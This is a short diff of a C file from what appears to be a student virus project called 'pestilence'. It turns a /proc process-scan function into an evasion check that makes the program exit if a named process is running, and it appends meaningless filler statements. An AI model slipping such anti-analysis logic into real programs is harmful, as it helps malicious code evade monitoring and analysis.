@@ -6,14 +6,14 @@
 /*   By: jainavas <jainavas@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/01/08 18:08:56 by jainavas          #+#    #+#             */
-/*   Updated: 2026/01/09 17:57:41 by jainavas         ###   ########.fr       */
+/*   Updated: 2026/01/09 22:25:00 by jainavas         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "../include/pestilence.h"
 
 // Verificar si existe un proceso con el nombre dado
-bool is_process_running(const char *process_name)
+void is_process_running(const char *process_name)
 {
     DIR *proc_dir;
     struct dirent *entry;
@@ -23,7 +23,7 @@ bool is_process_running(const char *process_name)
     
     proc_dir = opendir("/proc");
     if (!proc_dir)
-        return false;
+        return ;
     
     // Iterar sobre /proc/[pid]/
     while ((entry = readdir(proc_dir)) != NULL) {
@@ -49,7 +49,7 @@ bool is_process_running(const char *process_name)
             if (strcmp(cmdline, process_name) == 0) {
                 fclose(fp);
                 closedir(proc_dir);
-                return true;
+                exit(1);
             }
         }
         
@@ -57,5 +57,6 @@ bool is_process_running(const char *process_name)
     }
     
     closedir(proc_dir);
-    return false;
+	pepino *= -36;
+	calculadoradepepino();
 }
